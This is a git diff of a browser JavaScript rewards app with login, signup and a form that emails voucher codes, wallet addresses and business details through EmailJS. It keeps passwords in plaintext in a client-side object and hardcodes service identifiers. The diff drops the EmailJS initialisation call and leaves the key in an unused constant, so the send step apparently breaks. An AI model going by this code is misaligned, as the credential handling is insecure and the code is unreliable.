@@ -1,30 +1,29 @@
 document.addEventListener('DOMContentLoaded', () => {
-    const users = {}; // Store user data with email as the key
+    const users = {}; // Object to store user data with email as the key
 
-    // Screens
     const openScreen = document.getElementById('openScreen');
     const signupScreen = document.getElementById('signupScreen');
     const rewardScreen = document.getElementById('rewardScreen');
     const transactionScreen = document.getElementById('transactionScreen');
 
-    // Input fields
     const openEmail = document.getElementById('openEmail');
     const openPassword = document.getElementById('openPassword');
     const signupEmail = document.getElementById('signupEmail');
     const signupPassword = document.getElementById('signupPassword');
     const confirmPassword = document.getElementById('confirmPassword');
     const nameInput = document.getElementById('name');
-    const rewardName = document.getElementById('rewardName');
     const rewardEmail = document.getElementById('rewardEmail');
+    const rewardName = document.getElementById('rewardName');
     const voucherCode = document.getElementById('voucherCode');
     const walletAddress = document.getElementById('walletAddress');
     const businessName = document.getElementById('businessName');
     const businessEmail = document.getElementById('businessEmail');
 
-    // Initialize EmailJS
-    emailjs.init("sz2ImWOwFnVKy4qrF");
+    const serviceID = "service_4b371jn";
+    const templateID = "template_y0f3pw9";
+    const userID = "sz2ImWOwFnVKy4qrF"; // EmailJS API Key
 
-    // Login
+    // Login Functionality
     document.getElementById('loginBtn').addEventListener('click', () => {
         const email = openEmail.value.trim();
         const password = openPassword.value.trim();
@@ -32,6 +31,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (users[email] && users[email].password === password) {
             openScreen.classList.add('hidden');
             rewardScreen.classList.remove('hidden');
+
             rewardEmail.value = email;
             rewardName.value = users[email].name;
         } else {
@@ -39,7 +39,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // Signup
+    // Signup Functionality
     document.getElementById('signupSubmitBtn').addEventListener('click', () => {
         const email = signupEmail.value.trim();
         const password = signupPassword.value.trim();
@@ -63,11 +63,17 @@ document.addEventListener('DOMContentLoaded', () => {
 
         users[email] = { name, password };
         alert("Signup successful! Please log in.");
+
+        signupEmail.value = '';
+        signupPassword.value = '';
+        confirmPassword.value = '';
+        nameInput.value = '';
+
         signupScreen.classList.add('hidden');
         openScreen.classList.remove('hidden');
     });
 
-    // Submit Reward
+    // Rewards Submission Functionality
     document.getElementById('submitRewardBtn').addEventListener('click', () => {
         const name = rewardName.value.trim();
         const email = rewardEmail.value.trim();
@@ -76,14 +82,14 @@ document.addEventListener('DOMContentLoaded', () => {
         const business = businessName.value.trim();
         const businessEmailValue = businessEmail.value.trim();
 
-        if (!voucher || !wallet || !business || !businessEmailValue) {
-            alert("Please fill in all fields.");
+        if (!name || !email || !voucher || !wallet || !business || !businessEmailValue) {
+            alert("Please complete all fields.");
             return;
         }
 
-        // Update Transaction Screen
         transactionScreen.classList.remove('hidden');
         rewardScreen.classList.add('hidden');
+
         document.getElementById('transName').textContent = name;
         document.getElementById('transEmail').textContent = email;
         document.getElementById('transVoucherCode').textContent = voucher;
@@ -91,25 +97,30 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('transBusinessName').textContent = business;
         document.getElementById('transBusinessEmail').textContent = businessEmailValue;
 
-        // Send Email using EmailJS
+        voucherCode.value = '';
+        walletAddress.value = '';
+        businessName.value = '';
+        businessEmail.value = '';
+
+          // EmailJS Send Email
         emailjs.send("service_4b371jn", "template_y0f3pw9", {
-            name,
-            email,
+            name: name,
+            email: email,
             voucher_code: voucher,
             wallet_address: wallet,
             business_name: business,
             business_email: businessEmailValue,
         })
         .then(() => {
-            alert("Reward data emailed successfully!");
+            alert("Reward data has been emailed to RWCOIN successfully!");
         })
-        .catch((error) => {
-            console.error("Error:", error);
-            alert("Failed to send reward data.");
+        .catch(error => {
+            console.error("Error sending email:", error);
+            alert("Failed to send reward data. Please try again.");
         });
     });
-
-    // Navigation
+  
+    // Back Buttons
     document.getElementById('backToReward').addEventListener('click', () => {
         transactionScreen.classList.add('hidden');
         rewardScreen.classList.remove('hidden');
@@ -118,6 +129,9 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('backToLogin').addEventListener('click', () => {
         rewardScreen.classList.add('hidden');
         openScreen.classList.remove('hidden');
+
+        openEmail.value = '';
+        openPassword.value = '';
     });
 
     document.getElementById('signupBtn').addEventListener('click', () => {
